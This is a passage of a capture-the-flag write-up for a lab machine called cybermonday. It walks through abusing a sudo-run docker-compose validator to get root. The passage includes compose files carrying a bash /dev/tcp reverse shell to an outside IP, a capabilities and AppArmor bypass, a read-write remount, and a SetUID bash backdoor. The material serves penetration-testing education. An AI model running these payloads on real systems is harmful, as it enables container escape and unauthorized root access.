Linux cybermonday 5.10.0-24-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
...[snip]...
Last login: Sat Dec 2 15:16:08 2023 from 10.10.16.67
john@cybermonday:~$ whoami
john
```

Now we can get user.txt file

```console
john@cybermonday:~$ cat user.txt 
f02c98b77201********************
```

## **Shell as Root**

### **Enumeration**

When i got a a shell as user with password in linux first thing i do is run `sudo -l`

```console
john@cybermonday:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on localhost:
    (root) /opt/secure_compose.py *.yml
```

As we can see john can run this python script `/opt/secure_compose.py` on yml file as root


### **Source Code Review**

This is the python script which we found in `/opt/secure_compose.py`

```python
#!/usr/bin/python3
import sys, yaml, os, random, string, shutil, subprocess, signal

def get_user():
    return os.environ.get("SUDO_USER")

def is_path_inside_whitelist(path):
    whitelist = [f"/home/{get_user()}", "/mnt"]

    for allowed_path in whitelist:
        if os.path.abspath(path).startswith(os.path.abspath(allowed_path)):
            return True
    return False

def check_whitelist(volumes):
    for volume in volumes:
        parts = volume.split(":")
        if len(parts) == 3 and not is_path_inside_whitelist(parts[0]):
            return False
    return True

def check_read_only(volumes):
    for volume in volumes:
        if not volume.endswith(":ro"):
            return False
    return True

def check_no_symlinks(volumes):
    for volume in volumes:
        parts = volume.split(":")
        path = parts[0]
        if os.path.islink(path):
            return False
    return True

def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True

def main(filename):

    if not os.path.exists(filename):
        print(f"File not found")
        return False

    with open(filename, "r") as file:
        try:
            data = yaml.safe_load(file)
        except yaml.YAMLError as e:
            print(f"Error: {e}")
            return False

        if "services" not in data:
            print("Invalid docker-compose.yml")
            return False

        services = data["services"]

        if not check_no_privileged(services):
            print("Privileged mode is not allowed.")
            return False

        for service, config in services.items():
            if "volumes" in config:
                volumes = config["volumes"]
                if not check_whitelist(volumes) or not check_read_only(volumes):
                    print(f"Service '{service}' is malicious.")
                    return False
                if not check_no_symlinks(volumes):
                    print(f"Service '{service}' contains a symbolic link in the volume, which is not allowed.")
                    return False
    return True

def create_random_temp_dir():
    letters_digits = string.ascii_letters + string.digits
    random_str = ''.join(random.choice(letters_digits) for i in range(6))
    temp_dir = f"/tmp/tmp-{random_str}"
    return temp_dir

def copy_docker_compose_to_temp_dir(filename, temp_dir):
    os.makedirs(temp_dir, exist_ok=True)
    shutil.copy(filename, os.path.join(temp_dir, "docker-compose.yml"))

def cleanup(temp_dir):
    subprocess.run(["/usr/bin/docker-compose", "down", "--volumes"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    shutil.rmtree(temp_dir)

def signal_handler(sig, frame):
    print("\nSIGINT received. Cleaning up...")
    cleanup(temp_dir)
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Use: {sys.argv[0]} <docker-compose.yml>")
        sys.exit(1)

    filename = sys.argv[1]
    if main(filename):
        temp_dir = create_random_temp_dir()
        copy_docker_compose_to_temp_dir(filename, temp_dir)
        os.chdir(temp_dir)
        
        signal.signal(signal.SIGINT, signal_handler)

        print("Starting services...")
        result = subprocess.run(["/usr/bin/docker-compose", "up", "--build"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Finishing services")

        cleanup(temp_dir)
```
{: .nolineno }


So let's break things up to be able to identify what this script do .Starting form the main function

```python
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Use: {sys.argv[0]} <docker-compose.yml>")
        sys.exit(1)

    filename = sys.argv[1]
    if main(filename):
        temp_dir = create_random_temp_dir()
        copy_docker_compose_to_temp_dir(filename, temp_dir)
        os.chdir(temp_dir)
        
        signal.signal(signal.SIGINT, signal_handler)

        print("Starting services...")
        result = subprocess.run(["/usr/bin/docker-compose", "up", "--build"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Finishing services")

        cleanup(temp_dir)
```

The previous main code will do the following :
- Checks that exactly one arg is provided else it will exit
- The arg which will be provide is the filename
- Run the function which called `main` on the file which does a bunch of validation on the argument then returning True or False
- If the previous function return `True` then the following will done :
  - Create a temp directory then copies the input file into that directory named docker-compose.yml
  - Configure signal handler then calls subprocess to run `docker-compose up --build` onf the file
  - After starting the container it will do a cleanup which calls `docker-compose down --volumes` and then removes the temp directory

This is the `main` function which will do the checks

```python
def main(filename):

    if not os.path.exists(filename):
        print(f"File not found")
        return False

    with open(filename, "r") as file:
        try:
            data = yaml.safe_load(file)
        except yaml.YAMLError as e:
            print(f"Error: {e}")
            return False

        if "services" not in data:
            print("Invalid docker-compose.yml")
            return False

        services = data["services"]

        if not check_no_privileged(services):
            print("Privileged mode is not allowed.")
            return False

        for service, config in services.items():
            if "volumes" in config:
                volumes = config["volumes"]
                if not check_whitelist(volumes) or not check_read_only(volumes):
                    print(f"Service '{service}' is malicious.")
                    return False
                if not check_no_symlinks(volumes):
                    print(f"Service '{service}' contains a symbolic link in the volume, which is not allowed.")
                    return False
    return True
```

The function do the following :
- Check that the file exists
- Run `yaml.safe_load` to parse the yml file and returns the corresponding Python data structure
- Validate that it has a services key as `all compose files must have`
- Check for the existance of `privileged` flag in the items because this can disable lots of protections as you can see in this [link](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-privileged)
- Make the following checks on the volumes defined in the compose:
  - **check_whitelist :** This function check that the volume has three items separated by `:` and that the host path is on an allowed list
  - **check_read_only :** This function makes sure that each volume definition string ends in `:ro` to make it read only. 
  - **check_no_symlinks :** This function checks if the volumes are symlinks or not.

### **Priv Esclation**

Let's create normale docker-compose file and test if we can get shell on it

```yml
version: "3"
services:
  web:
    image: cybermonday_api
    command: bash -c 'bash -i >& /dev/tcp/10.10.16.67/9001 0>&1'
    volumes:
      - /home/john:/john_replica:ro
```

**Explanation**

- **version: "3":** Specifies the version of the Docker Compose file format.
- **services:** Defines the services that make up your application.
- **web:** The name of the service, in this case, "web" 
- **image: cybermonday_api:** Specifies the Docker image to use for this service. In this case, it's using an image named "cybermonday_api"
- **command: bash -c 'bash -i >& /dev/tcp/10.10.16.67/9001 0>&1':** Overrides the default command to be executed when the container starts. In this case, it runs a Bash command that establishes a reverse shell to the IP address 10.10.16.67 on port 9001.
- **volumes: - /home/john:/john_replica:ro :** Mounts the host directory /home/john into the container at the path /john_replica in read-only mode (ro stands for read-only). This allows data from the host's /home/john to be accessed by the container.

Run the Contatiner 

```console
john@cybermonday:~$ sudo /opt/secure_compose.py 0xRyuzak1.yml
[sudo] password for john: 
Starting services...
```

Getting rev shell

```console
(kali㉿kali)-[~]$ nc -lvnp 9001            
listening on [any] 9001 ...
connect to [10.10.16.67] from (UNKNOWN) [10.10.11.228] 39204
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6da4b1193c24:/var/www/html# 
```
Now let's try to remount the /john_replica but with write permission we can't do this from the docker-compose file because the script check for the `ro` and allow it only and not allow write permissions 

```console
root@b919eb60dec1:~# mount -o remount,rw /john
mount: /john: permission denied.
       dmesg(1) may have more information after failed mount system call.
```

According to this [link](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#escape-from-privileged-containers) let's try to adding capabilities to the container to give it more permissions

This can be done by adding the following two lines

```yml
version: "3"
services:
  web:
    image: cybermonday_api
    command: bash -c 'bash -i >& /dev/tcp/10.10.16.67/9001 0>&1'
    volumes:
      - /home/john:/john_replica:ro
    cap_add:
      - ALL
```
Trying the remount again

```console
root@6da4b1193c24:/var/www/html# mount -o remount,rw /john_replica
mount -o remount,rw /john_replica
mount: /john_replica: cannot remount /dev/sda1 read-write, is write-protected.
       dmesg(1) may have more information after failed mount system call.
```

Now we getting somewhere because the error changes

After some search i found this docker command to up a `full privs` in container without `--privileged`

```bash
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```

So i tryied to replicate all options using docker compose file and finally i found that the answer will be like the following 

```yml
version: "3"
services:
  web:
    image: cybermonday_api
    command: bash -c 'bash -i >& /dev/tcp/10.10.16.67/9001 0>&1'
    volumes:
      - /home/john:/john_replica:ro
    cap_add:
      - ALL
    security_opt:
      - apparmor:unconfined
```

Now let's trying again and finally it's working fine

```console
root@6da4b1193c24:/var/www/html# mount -o remount,rw /john_replica
mount -o remount,rw /john_replica
root@6da4b1193c24:/var/www/html# 
```

#### SetUID 

Now let's copy the bash binary to john home dir 

```console
john@cybermonday:~$ cp /bin/bash 0xRyuzak1
```

Now in the container let's update the owner and set it as SetUID/SetGID

```console
root@6da4b1193c24:/john# chown root:root 0xRyuzak1
root@6da4b1193c24:/john# chmod 6777 0xRyuzak1 
```

After that from the machine we can finally root the machine like the following 

```console
john@cybermonday:~$ ./0xRyuzak1 -p
0xRyuzak1-5.1# whoami
root
0xRyuzak1-5.1# id
uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)
```

We can get the root.txt file now

```console
0xRyuzak1-5.1# cat /root/root.txt
af648a57d10c********************
```